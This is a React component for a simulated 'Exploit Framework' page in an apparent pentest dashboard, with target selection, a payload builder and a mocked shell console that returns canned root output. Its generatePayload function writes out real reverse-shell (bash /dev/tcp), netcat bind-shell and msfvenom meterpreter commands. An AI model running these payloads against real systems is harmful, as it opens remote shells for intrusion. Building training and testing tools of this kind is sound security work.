import React, { useState, useEffect, useRef } from 'react';
import { useAuthStore } from '../store/authStore';
import { assetService, Asset } from '../services/assetService';

interface ExploitModule {
  id: string;
  name: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  payload_type: 'reverse_shell' | 'bind_shell' | 'meterpreter' | 'custom';
  target_service?: string;
  target_port?: number;
}

interface ShellSession {
  id: string;
  target_ip: string;
  target_port: number;
  status: 'connecting' | 'connected' | 'disconnected' | 'failed';
  type: 'reverse' | 'bind';
  created_at: Date;
}

const Exploit: React.FC = () => {
  const { token } = useAuthStore();
  const [assets, setAssets] = useState<Asset[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  
  // Exploit builder state
  const [exploitName, setExploitName] = useState('');
  const [exploitDescription, setExploitDescription] = useState('');
  const [payloadType, setPayloadType] = useState<'reverse_shell' | 'bind_shell' | 'meterpreter' | 'custom'>('reverse_shell');
  const [targetService, setTargetService] = useState('');
  const [targetPort, setTargetPort] = useState('');
  const [listenerIP, setListenerIP] = useState('');
  const [listenerPort, setListenerPort] = useState('4444');
  const [customPayload, setCustomPayload] = useState('');
  
  // Shell console state
  const [shellSessions, setShellSessions] = useState<ShellSession[]>([]);
  const [activeSession, setActiveSession] = useState<string | null>(null);
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState<string[]>([]);
  const terminalEndRef = useRef<HTMLDivElement>(null);
  
  // View state
  const [activeTab, setActiveTab] = useState<'assets' | 'builder' | 'console'>('assets');

  useEffect(() => {
    fetchExploitableAssets();
  }, [token]);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [output]);

  const fetchExploitableAssets = async () => {
    if (!token) return;
    setLoading(true);
    try {
      const allAssets = await assetService.getAssets(token);
      // Filter assets with open ports or known vulnerabilities
      const exploitable = allAssets.filter(asset => 
        asset.open_ports && asset.open_ports.length > 0
      );
      setAssets(exploitable);
    } catch (error) {
      console.error('Failed to fetch assets:', error);
    } finally {
      setLoading(false);
    }
  };

  const generatePayload = () => {
    let payload = '';
    
    switch (payloadType) {
      case 'reverse_shell':
        payload = `bash -i >& /dev/tcp/${listenerIP}/${listenerPort} 0>&1`;
        break;
      case 'bind_shell':
        payload = `nc -lvp ${listenerPort} -e /bin/bash`;
        break;
      case 'meterpreter':
        payload = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${listenerIP} LPORT=${listenerPort} -f elf > payload.elf`;
        break;
      case 'custom':
        payload = customPayload;
        break;
    }
    
    return payload;
  };

  const handleBuildExploit = () => {
    const payload = generatePayload();
    setOutput([
      '[+] Exploit Module Built Successfully',
      `[*] Name: ${exploitName}`,
      `[*] Target: ${selectedAsset?.ip_address || 'Not selected'}`,
      `[*] Payload Type: ${payloadType}`,
      `[*] Generated Payload:`,
      payload,
      '[!] Ready to execute. Use the Console tab to deploy.'
    ]);
    setActiveTab('console');
  };

  const handleExecutePayload = async () => {
    if (!selectedAsset) {
      setOutput(prev => [...prev, '[!] ERROR: No target selected']);
      return;
    }

    const newSession: ShellSession = {
      id: Math.random().toString(36).substring(7),
      target_ip: selectedAsset.ip_address,
      target_port: parseInt(targetPort) || 4444,
      status: 'connecting',
      type: payloadType === 'reverse_shell' ? 'reverse' : 'bind',
      created_at: new Date()
    };

    setShellSessions(prev => [...prev, newSession]);
    setActiveSession(newSession.id);
    
    setOutput(prev => [
      ...prev,
      `[*] Initializing ${payloadType} to ${selectedAsset.ip_address}:${targetPort}`,
      '[*] Setting up listener...',
      '[*] Waiting for connection...'
    ]);

    // Simulate connection process
    setTimeout(() => {
      setShellSessions(prev => 
        prev.map(s => s.id === newSession.id ? { ...s, status: 'connected' } : s)
      );
      setOutput(prev => [
        ...prev,
        `[+] Shell session ${newSession.id} opened`,
        `[+] Connected to ${selectedAsset.ip_address}`,
        `[*] Type commands below...`
      ]);
    }, 2000);
  };

  const handleSendCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim() || !activeSession) return;

    const currentCommand = command;
    setCommand('');
    setOutput(prev => [...prev, `# ${currentCommand}`]);

    // Simulate command execution
    setTimeout(() => {
      let response = '';
      if (currentCommand === 'whoami') {
        response = 'root';
      } else if (currentCommand === 'pwd') {
        response = '/root';
      } else if (currentCommand.startsWith('ls')) {
        response = 'Desktop\nDocuments\nDownloads\nflag.txt';
      } else if (currentCommand === 'id') {
        response = 'uid=0(root) gid=0(root) groups=0(root)';
      } else {
        response = `[*] Command executed: ${currentCommand}`;
      }
      setOutput(prev => [...prev, response]);
    }, 500);
  };

  const handleCloseSession = (sessionId: string) => {
    setShellSessions(prev => prev.filter(s => s.id !== sessionId));
    if (activeSession === sessionId) {
      setActiveSession(null);
    }
    setOutput(prev => [...prev, `[*] Session ${sessionId} closed`]);
  };

  const getVulnerabilityCount = (asset: Asset) => {
    // In real implementation, this would check the vulnerabilities table
    return asset.open_ports?.length || 0;
  };

  const getServiceIcon = (service: string) => {
    const icons: { [key: string]: string } = {
      'ssh': 'ğŸ”',
      'http': 'ğŸŒ',
      'https': 'ğŸ”’',
      'ftp': 'ğŸ“',
      'telnet': 'ğŸ“',
      'rdp': 'ğŸ–¥ï¸',
      'vnc': 'ğŸ‘ï¸',
      'mysql': 'ğŸ—„ï¸',
      'postgresql': 'ğŸ˜',
      'smb': 'ğŸªŸ'
    };
    return icons[service.toLowerCase()] || 'âš¡';
  };

  return (
    <div className="h-full flex flex-col space-y-4">
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="text-2xl font-bold text-cyber-red uppercase tracking-wider cyber-glow-red flex items-center">
            <span className="mr-3">ğŸ’€</span>
            Exploit Framework
          </h2>
          <p className="text-cyber-gray-light text-sm mt-1">Build and execute exploits against vulnerable targets</p>
        </div>
        <div className="flex space-x-2">
          <button
            onClick={() => setActiveTab('assets')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'assets' ? 'border-cyber-red text-cyber-red bg-cyber-red bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red'}`}
          >
            ğŸ¯ Targets
          </button>
          <button
            onClick={() => setActiveTab('builder')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'builder' ? 'border-cyber-purple text-cyber-purple bg-cyber-purple bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-purple hover:text-cyber-purple'}`}
          >
            ğŸ”§ Builder
          </button>
          <button
            onClick={() => setActiveTab('console')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'console' ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-green hover:text-cyber-green'}`}
          >
            ğŸ’» Console
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 bg-cyber-darker border border-cyber-gray rounded-lg overflow-hidden">
        {/* Assets Tab */}
        {activeTab === 'assets' && (
          <div className="h-full flex flex-col">
            <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
              <h3 className="text-cyber-blue font-bold uppercase text-sm flex items-center">
                <span className="mr-2">ğŸ¯</span>
                Exploitable Targets ({assets.length})
              </h3>
              <p className="text-xs text-cyber-gray-light mt-1">Assets with open ports and potential vulnerabilities</p>
            </div>
            
            <div className="flex-1 overflow-auto p-4">
              {loading ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-cyber-blue animate-pulse">Loading targets...</div>
                </div>
              ) : assets.length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-6xl mb-4 opacity-20">ğŸ¯</div>
                    <p className="text-cyber-gray-light">No exploitable targets found</p>
                    <p className="text-xs text-cyber-gray mt-2">Run a scan to discover assets</p>
                  </div>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {assets.map(asset => (
                    <div
                      key={asset.id}
                      onClick={() => setSelectedAsset(asset)}
                      className={`bg-cyber-dark border rounded-lg p-4 cursor-pointer transition-all hover:shadow-lg ${
                        selectedAsset?.id === asset.id
                          ? 'border-cyber-red shadow-cyber-red shadow-lg'
                          : 'border-cyber-gray hover:border-cyber-purple'
                      }`}
                    >
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex-1">
                          <h4 className="text-cyber-blue font-bold">{asset.hostname || asset.ip_address}</h4>
                          {asset.hostname && (
                            <p className="text-xs text-cyber-gray-light font-mono">{asset.ip_address}</p>
                          )}
                        </div>
                        {selectedAsset?.id === asset.id && (
                          <div className="text-cyber-red text-xl">âœ“</div>
                        )}
                      </div>
                      
                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-xs">
                          <span className="text-cyber-gray-light">OS:</span>
                          <span className="text-cyber-green">{asset.os_name || 'Unknown'}</span>
                        </div>
                        
                        <div className="flex items-center justify-between text-xs">
                          <span className="text-cyber-gray-light">Open Ports:</span>
                          <span className="text-cyber-purple font-bold">{asset.open_ports?.length || 0}</span>
                        </div>
                        
                        {asset.services && (
                          <div className="mt-3 pt-3 border-t border-cyber-gray">
                            <p className="text-xs text-cyber-gray-light mb-2">Services:</p>
                            <div className="flex flex-wrap gap-1">
                              {Object.keys(asset.services).slice(0, 4).map(port => (
                                <span
                                  key={port}
                                  className="text-xs px-2 py-0.5 bg-cyber-darker border border-cyber-blue text-cyber-blue rounded"
                                  title={`${asset.services[port].service} on port ${port}`}
                                >
                                  {getServiceIcon(asset.services[port].service)} {port}
                                </span>
                              ))}
                              {Object.keys(asset.services).length > 4 && (
                                <span className="text-xs px-2 py-0.5 bg-cyber-darker border border-cyber-gray text-cyber-gray rounded">
                                  +{Object.keys(asset.services).length - 4}
                                </span>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                      
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedAsset(asset);
                          setActiveTab('builder');
                        }}
                        className="w-full mt-3 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-2 text-xs font-bold"
                      >
                        âš¡ Select Target
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Builder Tab */}
        {activeTab === 'builder' && (
          <div className="h-full flex flex-col">
            <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
              <h3 className="text-cyber-purple font-bold uppercase text-sm flex items-center">
                <span className="mr-2">ğŸ”§</span>
                Exploit Module Builder
              </h3>
              {selectedAsset && (
                <p className="text-xs text-cyber-blue mt-1">
                  Target: {selectedAsset.ip_address} ({selectedAsset.hostname || 'Unknown'})
                </p>
              )}
            </div>
            
            <div className="flex-1 overflow-auto p-6">
              {!selectedAsset ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-6xl mb-4 opacity-20">ğŸ”§</div>
                    <p className="text-cyber-gray-light">No target selected</p>
                    <p className="text-xs text-cyber-gray mt-2">Select a target from the Targets tab</p>
                  </div>
                </div>
              ) : (
                <div className="max-w-3xl mx-auto space-y-6">
                  {/* Exploit Details */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded-lg p-6">
                    <h4 className="text-cyber-blue font-bold uppercase mb-4 text-sm">Module Information</h4>
                    
                    <div className="space-y-4">
                      <div>
                        <label className="block text-xs text-cyber-gray-light mb-1">Module Name</label>
                        <input
                          type="text"
                          value={exploitName}
                          onChange={(e) => setExploitName(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-purple outline-none"
                          placeholder="e.g., SSH Brute Force"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-cyber-gray-light mb-1">Description</label>
                        <textarea
                          value={exploitDescription}
                          onChange={(e) => setExploitDescription(e.target.value)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-purple outline-none"
                          rows={3}
                          placeholder="Describe what this exploit does..."
                        />
                      </div>
                    </div>
                  </div>

                  {/* Payload Configuration */}
                  <div className="bg-cyber-dark border border-cyber-gray rounded-lg p-6">
                    <h4 className="text-cyber-green font-bold uppercase mb-4 text-sm">Payload Configuration</h4>
                    
                    <div className="space-y-4">
                      <div>
                        <label className="block text-xs text-cyber-gray-light mb-1">Payload Type</label>
                        <select
                          value={payloadType}
                          onChange={(e) => setPayloadType(e.target.value as any)}
                          className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-green outline-none"
                        >
                          <option value="reverse_shell">Reverse Shell (Connect Back)</option>
                          <option value="bind_shell">Bind Shell (Listen on Target)</option>
                          <option value="meterpreter">Meterpreter (Advanced)</option>
                          <option value="custom">Custom Payload</option>
                        </select>
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="block text-xs text-cyber-gray-light mb-1">Target Service</label>
                          <input
                            type="text"
                            value={targetService}
                            onChange={(e) => setTargetService(e.target.value)}
                            className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-green outline-none"
                            placeholder="e.g., ssh, http"
                          />
                        </div>
                        
                        <div>
                          <label className="block text-xs text-cyber-gray-light mb-1">Target Port</label>
                          <input
                            type="text"
                            value={targetPort}
                            onChange={(e) => setTargetPort(e.target.value)}
                            className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-green outline-none"
                            placeholder="e.g., 22, 80"
                          />
                        </div>
                      </div>

                      {payloadType !== 'custom' && (
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <label className="block text-xs text-cyber-gray-light mb-1">Listener IP (Your IP)</label>
                            <input
                              type="text"
                              value={listenerIP}
                              onChange={(e) => setListenerIP(e.target.value)}
                              className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-green outline-none"
                              placeholder="e.g., 192.168.1.100"
                            />
                          </div>
                          
                          <div>
                            <label className="block text-xs text-cyber-gray-light mb-1">Listener Port</label>
                            <input
                              type="text"
                              value={listenerPort}
                              onChange={(e) => setListenerPort(e.target.value)}
                              className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white focus:border-cyber-green outline-none"
                              placeholder="e.g., 4444"
                            />
                          </div>
                        </div>
                      )}

                      {payloadType === 'custom' && (
                        <div>
                          <label className="block text-xs text-cyber-gray-light mb-1">Custom Payload</label>
                          <textarea
                            value={customPayload}
                            onChange={(e) => setCustomPayload(e.target.value)}
                            className="w-full bg-cyber-darker border border-cyber-gray rounded px-3 py-2 text-white font-mono text-sm focus:border-cyber-green outline-none"
                            rows={6}
                            placeholder="Enter your custom payload code..."
                          />
                        </div>
                      )}

                      {/* Payload Preview */}
                      <div className="bg-cyber-darker border border-cyber-blue rounded p-4">
                        <p className="text-xs text-cyber-gray-light mb-2">Generated Payload Preview:</p>
                        <pre className="text-cyber-green text-xs font-mono whitespace-pre-wrap break-all">
                          {generatePayload() || 'Configure payload settings to see preview...'}
                        </pre>
                      </div>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="flex space-x-4">
                    <button
                      onClick={handleBuildExploit}
                      className="flex-1 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-3 font-bold uppercase"
                    >
                      ğŸ”§ Build Module
                    </button>
                    <button
                      onClick={handleExecutePayload}
                      className="flex-1 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-3 font-bold uppercase"
                    >
                      âš¡ Execute Now
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Console Tab */}
        {activeTab === 'console' && (
          <div className="h-full flex flex-col">
            <div className="p-4 border-b border-cyber-gray bg-cyber-dark flex items-center justify-between">
              <div>
                <h3 className="text-cyber-green font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">ğŸ’»</span>
                  Shell Console
                </h3>
                {activeSession && (
                  <p className="text-xs text-cyber-blue mt-1">
                    Active Session: {shellSessions.find(s => s.id === activeSession)?.target_ip}
                  </p>
                )}
              </div>
              
              {/* Session Tabs */}
              {shellSessions.length > 0 && (
                <div className="flex items-center space-x-2">
                  {shellSessions.map(session => (
                    <div
                      key={session.id}
                      className={`flex items-center space-x-2 px-3 py-1 border rounded cursor-pointer ${
                        activeSession === session.id
                          ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10'
                          : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'
                      }`}
                      onClick={() => setActiveSession(session.id)}
                    >
                      <span className={`w-2 h-2 rounded-full ${
                        session.status === 'connected' ? 'bg-cyber-green animate-pulse' :
                        session.status === 'connecting' ? 'bg-cyber-blue animate-pulse' :
                        session.status === 'failed' ? 'bg-cyber-red' :
                        'bg-cyber-gray'
                      }`} />
                      <span className="text-xs font-mono">{session.target_ip}</span>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleCloseSession(session.id);
                        }}
                        className="text-cyber-red hover:text-white ml-1"
                      >
                        Ã—
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
            
            <div className="flex-1 flex flex-col bg-black text-green-500 font-mono p-4 text-sm">
              {shellSessions.length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-6xl mb-4 opacity-20">ğŸ’»</div>
                    <p className="text-cyber-gray-light">No active shell sessions</p>
                    <p className="text-xs text-cyber-gray mt-2">Execute a payload to start a session</p>
                  </div>
                </div>
              ) : (
                <>
                  <div className="flex-1 overflow-auto custom-scrollbar mb-4 space-y-1">
                    {output.map((line, i) => (
                      <div key={i} className="whitespace-pre-wrap break-all">
                        {line.startsWith('[+]') && <span className="text-cyber-green">{line}</span>}
                        {line.startsWith('[*]') && <span className="text-cyber-blue">{line}</span>}
                        {line.startsWith('[!]') && <span className="text-cyber-red">{line}</span>}
                        {!line.startsWith('[') && line}
                      </div>
                    ))}
                    <div ref={terminalEndRef} />
                  </div>
                  
                  {activeSession && shellSessions.find(s => s.id === activeSession)?.status === 'connected' && (
                    <form onSubmit={handleSendCommand} className="flex items-center space-x-2 border-t border-cyber-gray pt-4">
                      <span className="text-cyber-red font-bold">#</span>
                      <input
                        type="text"
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        className="flex-1 bg-transparent border-none outline-none text-green-500"
                        placeholder="Enter command..."
                        autoFocus
                      />
                    </form>
                  )}
                </>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Exploit;
